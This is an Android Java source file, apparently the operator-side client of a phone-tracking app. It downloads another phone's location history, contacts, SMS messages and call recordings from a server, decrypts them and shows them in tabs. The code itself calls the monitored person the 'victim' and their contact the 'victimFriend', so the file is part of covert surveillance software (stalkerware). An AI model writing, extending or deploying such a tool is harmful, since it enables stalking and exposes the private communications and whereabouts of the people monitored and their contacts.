package com.sunnet.trackapp.client.ui.activity;

import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.SystemClock;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AppCompatActivity;

import com.ogaclejapan.smarttablayout.SmartTabLayout;
import com.ogaclejapan.smarttablayout.utils.v4.FragmentPagerItemAdapter;
import com.ogaclejapan.smarttablayout.utils.v4.FragmentPagerItems;
import com.sunnet.trackapp.client.R;
import com.sunnet.trackapp.client.application.MyApplication;
import com.sunnet.trackapp.client.asynctask.ConcurrentAsyncTask;
import com.sunnet.trackapp.client.db.DatabaseHelper;
import com.sunnet.trackapp.client.db.config.OrmliteManager;
import com.sunnet.trackapp.client.db.entity.CallVoiceEntity;
import com.sunnet.trackapp.client.db.entity.ContactEntity;
import com.sunnet.trackapp.client.db.entity.LocationEntity;
import com.sunnet.trackapp.client.db.entity.SMSEntity;
import com.sunnet.trackapp.client.log.Log;
import com.sunnet.trackapp.client.task.request.StatisticalRequest;
import com.sunnet.trackapp.client.task.response.StatisticalResponse;
import com.sunnet.trackapp.client.task.sender.StatisticalSender;
import com.sunnet.trackapp.client.ui.fragmnet.CallVoiceFragment;
import com.sunnet.trackapp.client.ui.fragmnet.ContactFragment;
import com.sunnet.trackapp.client.ui.fragmnet.LocationFragment;
import com.sunnet.trackapp.client.ui.fragmnet.SmsFragment;
import com.sunnet.trackapp.client.util.ConfigApi;
import com.sunnet.trackapp.client.util.GlobalSingleton;
import com.sunnet.trackapp.client.util.SharedPreferencesUtility;
import com.sunnet.trackapp.client.util.Utils;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {
    private final int TAB_LOCATION = 0;
    private final int TAB_CALL_LOG = 1;
    private final int TAB_CALL_VOICE = 2;
    private final int TAB_CAPTURE = 3;
    private final int TAB_CONTACT = 4;
    private final int TAB_SMS = 5;

    //-- View
    private SmartTabLayout smartTabLayout;
    private ViewPager viewPager;
    //-- Resources
    private FragmentPagerItemAdapter adapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initView();
        init();
    }

    private void initView() {
        smartTabLayout = (SmartTabLayout) findViewById(R.id.view_pager_tab);
        viewPager = (ViewPager) findViewById(R.id.view_pager);
    }

    private void initResources() {
        adapter = new FragmentPagerItemAdapter(
                getSupportFragmentManager(), FragmentPagerItems.with(this)
                .add(R.string.tab_title_location, LocationFragment.class, makeBundleTab(TAB_LOCATION))
                .add(R.string.tab_title_contact, ContactFragment.class, makeBundleTab(TAB_CONTACT))
                //.add(R.string.tab_title_call_log, CallLogFragment.class, makeBundleTab(TAB_CALL_LOG))
                .add(R.string.tab_title_call_voice, CallVoiceFragment.class, makeBundleTab(TAB_CALL_VOICE))
                //.add(R.string.tab_title_capture, CaptureFragment.class, makeBundleTab(TAB_CAPTURE))
                .add(R.string.tab_title_sms, SmsFragment.class, makeBundleTab(TAB_SMS))
                .create());
        viewPager.setAdapter(adapter);
        viewPager.setOnPageChangeListener(new ViewPager.OnPageChangeListener() {
            @Override
            public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {

            }

            @Override
            public void onPageSelected(int position) {

            }

            @Override
            public void onPageScrollStateChanged(int state) {

            }
        });
        smartTabLayout.setViewPager(viewPager);
    }

    private void init() {
        new ConcurrentAsyncTask<Void, Void, Boolean>() {
            @Override
            protected Boolean doInBackground(Void... params) {
                OrmliteManager.initialize(MyApplication.getContext());
                //-- Store version of app currently
                try {
                    SharedPreferencesUtility.getInstance()
                            .putString(SharedPreferencesUtility.VERSION_APP_INSTALLED,
                                    MyApplication.getContext().getPackageManager()
                                            .getPackageInfo(MyApplication.getContext().getPackageName(), 0).versionCode + "");
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }
                return true;
            }

            @Override
            protected void onPostExecute(Boolean aBoolean) {
                if (SharedPreferencesUtility.getInstance().getBoolean(SharedPreferencesUtility.IS_FIRST_INSTALL, true)) {
                    SharedPreferencesUtility.getInstance().putBoolean(SharedPreferencesUtility.IS_FIRST_INSTALL, false);
                    loadAllDataFromServer(true, new Handler() {
                        @Override
                        public void handleMessage(Message msg) {
                            initResources();
                        }
                    });
                } else {
                    initResources();
                }
            }
        }.executeConcurrently();
    }

    private Bundle makeBundleTab(int index) {
        Bundle mBundle = new Bundle();
        switch (index) {
            case TAB_LOCATION:
                //-- Put param in here
                break;
            case TAB_CALL_LOG:
                //-- Put param in here
                break;
            case TAB_CALL_VOICE:
                //-- Put param in here
                break;
            case TAB_CAPTURE:
                //-- Put param in here
                break;
            case TAB_CONTACT:
                //-- Put param in here
                break;
            case TAB_SMS:
                //-- Put param in here
                break;
        }
        return mBundle;
    }

    /**
     * Load all data from server
     */
    public void loadAllDataFromServer(final boolean isShowProgress, final Handler mHandler) {
        if (!Utils.isNetworkAvailable()) {
            Utils.showAlertDialog(this, R.string.network, R.string.network_failure, false);
            return;
        }
        if (isShowProgress)
            Utils.showProgressDialog(this, null, getString(R.string.loading));
        StatisticalSender sender = new StatisticalSender();
        sender.apiKey = ConfigApi.API_KEY;
        sender.timeStamp = SystemClock.currentThreadTimeMillis();
        sender.token = ConfigApi.genToken(sender.timeStamp);

        final StatisticalRequest request = new StatisticalRequest(sender, new Callback<StatisticalResponse>() {
            @Override
            public void onResponse(Call<StatisticalResponse> call, final Response<StatisticalResponse> response) {
                if (response != null && response.body() != null) {
                    StatisticalResponse data = response.body();
                    new ConcurrentAsyncTask<StatisticalResponse, Void, Object[]>() {
                        @Override
                        protected Object[] doInBackground(StatisticalResponse... params) {
                            StatisticalResponse.Result result = params[0].result;
                            List<LocationEntity> locationList = null, locationEncryptedList = null;
                            List<ContactEntity> contactList = null, contactEncryptedList = null;
                            List<SMSEntity> smsList = null, smsEncryptedList = null;
                            List<CallVoiceEntity> callVoiceList = null, callVoiceEncrypted = null;

                            /**
                             * Location
                             */
                            if (result.locationList != null && result.locationList.size() > 0) {
                                locationList = new ArrayList<LocationEntity>();
                                locationEncryptedList = new ArrayList<LocationEntity>();
                                for (StatisticalResponse.Result.Location loc : result.locationList) {
                                    if (loc.logsList != null && loc.logsList.size() > 0) {
                                        for (StatisticalResponse.Result.Location.Logs log : loc.logsList) {
                                            //-- Encrypted
                                            LocationEntity entityEncrypted = new LocationEntity(log.lat + log.lng, log);
                                            if (!locationEncryptedList.contains(entityEncrypted)) {
                                                locationEncryptedList.add(entityEncrypted);
                                            }
                                            //-- Decrypt
                                            LocationEntity entity = new LocationEntity(log.lat + log.lng, log);
                                            entity.decrypt();
                                            if (!locationList.contains(entity)) {
                                                locationList.add(entity);
                                            }
                                        }
                                    }
                                }
                                //-- Store data plain text
                                if (locationList.size() > 0) {
                                    GlobalSingleton.getInstance().setLocationList(locationList);
                                }
                            }
                            /**
                             * Contact
                             */
                            if (result.contactList != null && result.contactList.size() > 0) {
                                contactList = new ArrayList<ContactEntity>();
                                contactEncryptedList = new ArrayList<ContactEntity>();
                                for (StatisticalResponse.Result.Contact contact : result.contactList) {
                                    //-- Encrypted
                                    ContactEntity entityEncrypted = new ContactEntity(contact);
                                    contactEncryptedList.add(entityEncrypted);
                                    //-- Decrypt
                                    ContactEntity entity = new ContactEntity(contact);
                                    entity.decrypt();
                                    contactList.add(entity);
                                }
                                //-- Store data plain text
                                if (contactList.size() > 0) {
                                    GlobalSingleton.getInstance().setContactList(contactList);
                                }
                            }
                            /**
                             * Sms and Call voice
                             */
                            if (result.smsAndRecorderList != null && result.smsAndRecorderList.size() > 0) {
                                smsList = new ArrayList<SMSEntity>();
                                smsEncryptedList = new ArrayList<SMSEntity>();
                                callVoiceList = new ArrayList<CallVoiceEntity>();
                                callVoiceEncrypted = new ArrayList<CallVoiceEntity>();
                                String victimNumber, victimFriendNumber;
                                for (StatisticalResponse.Result.SmsAndRecorder smsAndRecorder : result.smsAndRecorderList) {
                                    victimNumber = smsAndRecorder.victimNumber;
                                    victimFriendNumber = smsAndRecorder.victimFriendNumber;

                                    smsAndRecorder.decrypt();
                                    //-- Sms
                                    if (smsAndRecorder.smsList != null && smsAndRecorder.smsList.size() > 0) {
                                        for (StatisticalResponse.Result.SmsAndRecorder.Sms sms : smsAndRecorder.smsList) {
                                            //-- Encrypted
                                            SMSEntity entityEncrypted = new SMSEntity(victimNumber, victimFriendNumber, sms);
                                            smsEncryptedList.add(entityEncrypted);
                                            //-- Decrypt
                                            SMSEntity entity = new SMSEntity(smsAndRecorder, sms);
                                            entity.decryptFromResponse();
                                            smsList.add(entity);
                                        }
                                    }
                                    if (smsAndRecorder.recorderList != null && smsAndRecorder.recorderList.size() > 0) {
                                        for (StatisticalResponse.Result.SmsAndRecorder.Recorder recorder : smsAndRecorder.recorderList) {
                                            //-- Encrypt
                                            CallVoiceEntity entityEncrypted = new CallVoiceEntity(victimFriendNumber, recorder);
                                            callVoiceEncrypted.add(entityEncrypted);
                                            //-- Decrypt
                                            CallVoiceEntity entity = new CallVoiceEntity(smsAndRecorder, recorder);
                                            callVoiceList.add(entity);
                                        }
                                    }
                                }
                                //-- Store data plain text
                                if (smsList.size() > 0) {
                                    GlobalSingleton.getInstance().setSmsList(smsList);
                                }
                                //-- Store data plain text
                                if (callVoiceList.size() > 0) {
                                    GlobalSingleton.getInstance().setVoiceList(callVoiceList);
                                }
                            }
                            return new Object[]{locationEncryptedList, contactEncryptedList, smsEncryptedList, callVoiceEncrypted};
                        }

                        @Override
                        protected void onPostExecute(Object[] objects) {
                            if (mHandler != null) {
                                mHandler.sendEmptyMessage(1);
                            }

                            List<LocationEntity> locationEncryptedList = (List<LocationEntity>) objects[0];
                            List<ContactEntity> contactEncryptedList = (List<ContactEntity>) objects[1];
                            List<SMSEntity> smsEncryptedList = (List<SMSEntity>) objects[2];
                            List<CallVoiceEntity> callVoiceEncrypted = (List<CallVoiceEntity>) objects[3];

                            DatabaseHelper.createAllLocation(locationEncryptedList);
                            DatabaseHelper.createAllContact(contactEncryptedList);
                            DatabaseHelper.createAllSms(smsEncryptedList);
                            DatabaseHelper.createAllCallVoice(callVoiceEncrypted);

                            if (isShowProgress)
                                Utils.dismissProgressDialog();
                        }
                    }.executeConcurrently(data);
                } else {
                    Utils.showAlertDialog(MainActivity.this, R.string.load_data, R.string.not_data, false);
                    if (isShowProgress)
                        Utils.dismissProgressDialog();
                }
            }

            @Override
            public void onFailure(Call<StatisticalResponse> call, Throwable t) {
                Log.e(MainActivity.class.getName() + " StatisticalRequest " + t.toString());
                if (isShowProgress)
                    Utils.dismissProgressDialog();
            }
        });
        request.execute();
    }
}
